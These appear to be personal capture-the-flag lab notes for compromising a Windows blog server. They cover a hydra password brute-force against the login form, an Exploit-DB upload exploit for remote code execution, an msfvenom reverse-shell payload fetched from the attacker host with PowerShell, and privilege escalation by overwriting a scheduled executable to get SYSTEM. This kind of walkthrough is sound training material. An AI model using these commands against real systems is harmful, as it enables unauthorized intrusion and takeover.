- nmap

- go to webpage, see a post by 'Admin' author

- find a login page

- [[hydra]] brute force against 'Admin'

- `hydra -l Admin -P /usr/share/wordlists/rockyou.txt 10.10.224.5 http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=5gosXTA%2B5QhqWzJl2K7Arh4rnTLG3ZZ1tZ07Gba0yHgNpcIT6yabQfoVgZhVeThpJwKdCwJAU%2Baes9J3XOlB7V5KBLZeL3c4m9sOf0gjJCeywWT%2F7QYO8dVE1fMcCY1nz2fgfC23on00342cFVmEsorBuhMHdkhlL5HsWUyW3Een%2BH%2FpixXO640jD6G7XX2ovhTXhGjA7TVRZYSz3WEuUbDyNcFdhOGkp2qKJgVcbxJDg4nM6UHUqrbF3noJvwosCG%2F33eUIU1z7Qdtld7uu92%2BEx6m%2Fz9nFb3Thsb7ovQeERIB9%2FICkUWEGQZY1fKwtQWoXBnAKsqxC7Xwa81Aw%2FVG%2Fn7CsGg5JnUHKuEPRoAZmEapI&__EVENTVALIDATION=dnLWol2bwsFpU%2F9ohAw6r0PliYBMPAxzmLraLntUH9ugWWH8UvPcEEpoJxmMb7VBiRfmHNF6sVtUXoy7OrQ9ixZub%2FJn8vmnqAgOpbHFHkL8wesO5IOB3oIqD9RIpQkIyQ6SkSEGeNxBGjvYYsjLikt80rKQK5Nt%2BxJygt9vaoMKrkT5&ctl00%24MainContent%24LoginUser%24UserName=Admin&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:failed"`

- After the `http-post-form` we are looking for `"/LOGIN_PAGE/TO_FORCE.FULL_EXTENSION:FULL_POST_REQUEST_BODY_INCLUDING_USERNAME=^USER^&PASSWORD=^PASS^:RESPONSE_TO_PARSE_FOR_FAILED_AUTH"` which is three quotation fields separated by colons as "FIELD1:FIELD2:FIELD3"

- Login is cracked as Admin:1qaz2wsx

-  Immediately go to "About" tab to find service and version number

- Plug this into Exploit-DB and find CVE-2019-6714

- Follow instructions on exploit ([https://www.exploit-db.com/raw/46353](https://www.exploit-db.com/raw/46353)) to upload a file as a "theme" and run it

- Receive a shell on the listener you obviously already had set up for the specified port in the script

- `whoami` = `iis apppool\blog`
- Move to a Metasploit shell for stability and capabilities
	- Generate msfvenom payload `msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -f exe LHOST=10.10.126.72 LPORT=8337 -o meter.exe`
	- Set up `exploit/multi/handler` and set PAYLOAD, LHOST, LPORT
	- Host a python server with `meter.exe`
	- Back on target, `powershell Invoke-WebRequest -URI http://10.10.126.72:8005/meter.exe -OutFile meter.exe` (from a writable dir) and `start meter.exe`
	- Enumerate services from meterpreter with `run post/windows/gather/enum_services`
	- We see a `WindowsScheduler` which works similarly to linux chron jobs
	- Navigate to `\Program Files (x86)\SystemScheduler` to see currently scheduled jobs
	- There are plenty of .exe files here, `message.exe` looks promising and is writeable, overwrite it to execute a reverse shell will admin privs
OR

- Get a normal shell with `msfvenom -p windows/shell_reverse_tcp...`
- enumerate services with `tasklist` seeing a `WScheduler` and some other one-off services
- nav to `C:\Program Files (x86)` finding a `SystemScheduler` dir
- `icacls * | findstr (M)` to list all modifiable service files in the dir
- Check logs???? to see what services are run frequently -> `Message.exe`
- Host another python server, now with a new msfvenom payload (identical to last one but with a new port) and grab it from the target via `powershell Invoke-WebRequest`
- setup a listener for the new port
- `move \tmp\shell.exe "\Program Files (x86)\Message.exe"` and receive the shell as soon as the scheduler runs the edited .exe
- with `NT AUHTORITY\SYSTEM` go ahead and cat flags from jeff and admin :)